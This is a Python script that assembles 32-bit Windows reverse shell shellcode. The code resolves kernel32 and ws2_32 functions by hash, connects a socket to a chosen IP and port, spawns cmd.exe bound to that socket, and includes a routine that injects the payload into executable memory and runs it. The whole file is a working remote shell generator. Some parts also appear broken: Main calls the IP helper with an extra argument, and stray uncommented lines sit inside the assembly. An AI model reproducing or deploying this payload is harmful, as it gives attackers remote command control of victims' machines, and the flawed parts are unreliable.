from keystone import *
from sys import argv
from socket import htons
from compute_hash import api_hash
import ctypes


def convertIpAddrStringToHexadecimal(ipaddr_str: str):
    ipaddr_b = ipaddr_str.split('.')  # ['192', '168', '220', '127']
    ipaddr_b.reverse()  # ['127', '220', '168', '192']
    return '0x'+''.join([f'{hex(int(ip))[2:].rjust(2, "0")}' for ip in ipaddr_b])


def GetSmallShellcode(ipaddr: str, port: int = 9001, ReturnString: bool = False):
    port = htons(port)
    # ! https://idafchev.github.io/images/windows_shellcode/locate_dll.png
    CODE = (
        f'''
    start:
        mov ebp, esp;
        sub sp, 0x610;

    find_kernel32:
        xor ecx, ecx;
        mov esi, dword ptr fs:[ecx + 0x30];     // &PEB
        mov esi, dword ptr[esi + 0xc];          // PEB->Ldr
        mov esi, dword ptr[esi + 0x1c];         // Ldr.InInitializationOrderModuleList

    parse_next_module:
        mov ebx, dword ptr[esi + 0x8];          // EBX = InInitOrder[x].DllBase
        mov edi, dword ptr[esi + 0x20];         // EDI = InInitOrder[x].BaseDllName
        mov esi, [esi];                         // ESI = InInitOrder[x].Flink
        cmp word ptr[edi + 12 * 2], cx;         // (unicode) modulename[12] == 0?
                                                // expecting modulename == 'kernel32.dll' (12 chars)
        jne parse_next_module;                  // Not found; try next module

    find_function_jmp:
        jmp callback;

    find_function_ret:
        pop esi;                                // &ret_addr == &find_function
        mov dword ptr[ebp + 0x4], esi;          // store &ret_addr
        jmp resolve_k32_sym;

    callback:
        call find_function_ret;

    find_function:
        add esp, 0x4;
        pop eax;                                // EAX = 0x0c
        push 0xffffffff;                        // arbitrary constant to (1) signify end of arguments
                                                // and (2) move ESP back
        add esp, eax;                           // ESP += 0xc --> ESP pointing 4 bytes before arg0

    find_function_loop2:
        mov eax, dword ptr[ebx + 0x3c];         // Kernel32 PE Header
        mov edi, dword ptr[ebx + eax + 0x78];   // Kernel32 Export Dir Table (EDT) relative address
        add edi, ebx;                           // EDT Address
        mov ecx, dword ptr[edi + 0x18];         // ECX = EDT.NumberOfNames
        mov eax, dword ptr[edi + 0x20];         // EAX = EDT.AddressOfNames relative address
        add eax, ebx;                           // EAX = EDT.AddressOfNames
        mov dword ptr[ebp - 0x4], eax;

    find_function_loop:
        dec ecx;
        mov eax, dword ptr[ebp - 0x4];
        mov esi, dword ptr[eax + ecx * 4];      // Index of AddressName
        add esi, ebx;                           // Actual Address of Function Name

    compute_hash:
        xor eax, eax;
        cdq;

    compute_hash_repeat:                        // edx == currentFunctionName
        ror edx, 0xd;
        add edx, eax;
        lodsb;
        test al, al;
        jnz compute_hash_repeat;

    find_function_compare:
        cmp edx, dword ptr[esp - 4];            // Hash(edx) == arg0 ?
        jnz find_function_loop;
        mov edx, dword ptr[edi + 0x24];         // EDX = EDT.AddressOfNameOrdinals Relative
        add edx, ebx;                           // get actual addr
        mov cx, word ptr[edx + 2 * ecx];        // ECX = index of that address from Ordinals
        mov edx, dword ptr[edi + 0x1c];         // EDX = EDT.AddressOfFunctions Relative
        add edx, ebx;                           // get actual addr
        mov eax, dword ptr[edx + 4 * ecx];      // EAX = EDT.AddressOfFunctions[ecx] Relative
        add eax, ebx;                           // get actual addr
        push eax;                               // replace argN hash with actualFunctionAddr.
                                                // N depends how many times we have reached this addr
                                                // first time = arg0, second time = arg1, so on.
        cmp dword ptr[esp - 4], 0xffffffff;     // isLastArgument()
        jnz find_function_loop2;

    find_function_finish:
        sub esp, 0x8;                           // &esp = &load_ws2_32
        ret;

    resolve_k32_sym:
        push {api_hash("LoadLibraryA")};
        push {api_hash("CreateProcessA")};
        push 0xc;                               // 4 * argc + 4 = 0xc; argc = 2;
        call dword ptr[ebp + 0x4];              // call &find_function

    load_ws2_32:
        xor eax, eax;
        mov ax, 0x6c6c;
        push eax;                               // load 'ws2_32.dll'
        push 0x642e3233;
        push 0x5f327377;
        push esp;                               // &esp == &"ws2_32.dll" in stack
        call dword ptr[esp + 0x18];             // &[esp+0x18] = &resolve_k32_sym = &LoadLibraryA

    resolve_ws2_sym:
        mov ebx, eax;                           // ws2_32.dll Module BaseAddr
        push {api_hash("connect")};
        push {api_hash("WSASocketA")};
        push 0xc;
        call dword ptr[ebp + 0x4];              // call &find_function

    call_wsasocketa:
        xor eax, eax;
        push eax;
        push eax;
        push eax;
        push 0x6;
        push 0x1;
        push 0x2;
        call dword ptr[esp + 0x1c];             // WSASocketA(2,1,6,0,0,0)
                                                // WSASocketA(AF_INET,
                                                              SOCKET_STREAM,
                                                              IPPROTO_TCP,
                                                              NULL, NULL, NULL)
                                                // Also note, esp+0x1c is arg1 bcus we have
                                                // 0x18 used for the arguments in WSASocketA

    call_connect:
        mov ebx, eax;                           // EBX = &SOCKET
        xor edi, edi;
        xor eax, eax;
        push edi;
        push edi;
        push {ipaddr};                          // ip address
        mov di, {port};                         // port default = 9001
        shl edi, 0x10;
        add di, 0x2;                            // AF_INET
        push edi;
        mov edi, esp;
        push 0x10;                              // namelen
        push edi;                               // struct for sockaddr_in containing ipaddr, port, AF_INET
        push ebx;
        call dword ptr[esp + 0x24];             // there are 0x1c bytes used in the
                                                // argument for connect
                                                // connect(&SOCKET, sockaddr, namelen=0x10)

    // This location creates a structure for STARTUPINFOA
    // This structure is necessary for an argument for CreateProcessA
    create_startupinfoa:
        xor ecx, ecx;
        mov esi, esp;
        std;                                    // SET Direction Flag
                                                // Decrement index registers
        mov cl, 0x23;
        rep stosd;                              // memset(&edi-cl, eax, cl)
                                                // EAX = 0
                                                // ZERO out a bunch of arguments for STARTUPINFOA in the stack
        cld;                                    // CLEAR Direction Flag
        push ebx;                               // hStdError
        push ebx;                               // hStdOutput
        push ebx;                               // hStdInput
        push eax;
        push eax;
        inc ch;
        push ecx;                               // dwFlags: 0x0100 = STARTF_USESTDHANDLES
        dec ch;
        sub esp, 0x28;
        mov al, 0x44;
        push eax;                               // cb = 0x44
        mov edi, esp;                           // edi = &STARTUPINFOA

    create_cmd_str:
        mov eax, 0xff9b929d;
        neg eax;                                // EAX = L'cmd'
        push eax;
        mov ebx, esp;                           // EBX = &esp = &'cmd'

    call_createprocessa:
        mov eax, esp;                           // EAX = &esp = &'cmd'
        add eax, 0xfffffc70;                    // use esp -= 0x390 space (highly unlikely to be used)
                                                // and highly likely to be still inside stack space
        push eax;                               // lpProcessInformation = somewhere in Stack
        push edi;                               // lpStartupInfo = &STARTUPINFOA
        sub esp, 0xc;                           // NULLs
        push 0x1;                               // bInheritHandles == True
        push ecx;
        push ecx;
        push ebx;                               // lpCommandLine == &"cmd"
        push ecx;
        lea edx, dword ptr[esp + 0x54];
        call dword ptr[edx + 0x48];             // CreateProcessA (use debug to find offset)
    '''
    )
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
    instructions = ""
    for dec in encoding:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    if ReturnString:
        return "".join([f"\\x{ins:02x}" for ins in encoding]).rstrip("\n")
    else:
        return bytearray(encoding)


def DebugShellcode(shellcode: bytes):
    sh = b'\xcc' + shellcode  # \xcc == int3 == breakpoint
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(sh)),
                                              ctypes.c_int(MEM_COMMIT | MEM_RESERVE),
                                              ctypes.c_int(PAGE_EXECUTE_READWRITE))
    buf = (ctypes.c_char * len(sh)).from_buffer_copy(sh)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(sh)))

    print(f"Shellcode is located at address {hex(ptr)}")

    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def Main(ipaddr: str = '192.168.1.10', port: int = 9001):
    return GetSmallShellcode(convertIpAddrStringToHexadecimal(ipaddr, port))


def isIp(ipstr: str):
    return len(ipstr.split('.')) == 4


if __name__ == "__main__":
    debug = False
    server = "192.168.170.131"
    try:
        if isIp(argv[1]):
            server = argv[1]
        else:
            debug = argv[1] == "debug"
    except IndexError:
        pass
    if not debug:
        ipaddr = convertIpAddrStringToHexadecimal(server)
        shellcode = GetSmallShellcode(ipaddr, ReturnString=True)
        print(shellcode)
        exit(0)
    ipaddr = convertIpAddrStringToHexadecimal(server)
    DebugShellcode(GetSmallShellcode(ipaddr))
